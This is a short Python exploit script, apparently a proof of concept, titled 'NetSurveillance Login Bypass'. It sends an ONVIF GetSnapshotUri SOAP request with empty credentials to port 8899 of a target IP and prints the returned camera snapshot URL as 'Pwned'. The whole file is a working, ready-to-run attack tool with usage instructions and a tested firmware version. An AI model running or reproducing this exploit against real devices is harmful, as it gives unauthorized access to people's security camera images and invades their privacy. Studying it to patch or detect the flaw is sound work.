exploit.py

import requests
import re
import sys
from html import unescape

def fazer_requisicao(ip):
    url = f"http://{ip}:8899/onvif/Media"
    headers = {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.5",
    }

    xml_payload = """
    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://www.w3.org/2003/05/soap-envelope" >
        <soap:Header>
            <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                <UsernameToken>
                    <Username></Username>
                    <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                    <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                    <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
                </UsernameToken>
            </Security>
        </soap:Header>
        <soap:Body>
            <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
                <ProfileToken>000</ProfileToken>
            </GetSnapshotUri>
        </soap:Body>
    </soap:Envelope>
    """

    response = requests.post(url, headers=headers, data=xml_payload)
    return response.text

def extrair_link_resposta(xml_resposta):
    pattern = re.compile(r'<tt:Uri>(.*?)</tt:Uri>')
    match = pattern.search(xml_resposta)
    if match:
        link = match.group(1)
        link = unescape(link.replace("&amp;", "&"))
        return link
    else:
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("\n       === NetSurveillance Login Bypass ===\n")
        print("[*] Tested version: V5.00.R02.00030695.10010.244306\n")
        print("How to use: python3 exploit.py <IP TARGET>\n")
        sys.exit(1)
    ip = sys.argv[1]
    xml_resposta = fazer_requisicao(ip)

    link = extrair_link_resposta(xml_resposta)
    if link:
        print("\n       === NetSurveillance Login Bypass ===\n")
        print("[*] Tested version: V5.00.R02.00030695.10010.244306\n")
        print("[+] Pwned:", link,"\n")
    else:
        print("\n       === NetSurveillance Login Bypass ===\n")
        print("[*] Tested version: V5.00.R02.00030695.10010.244306\n")
        print("[!] Doesn't seem vulnerable :(\n")
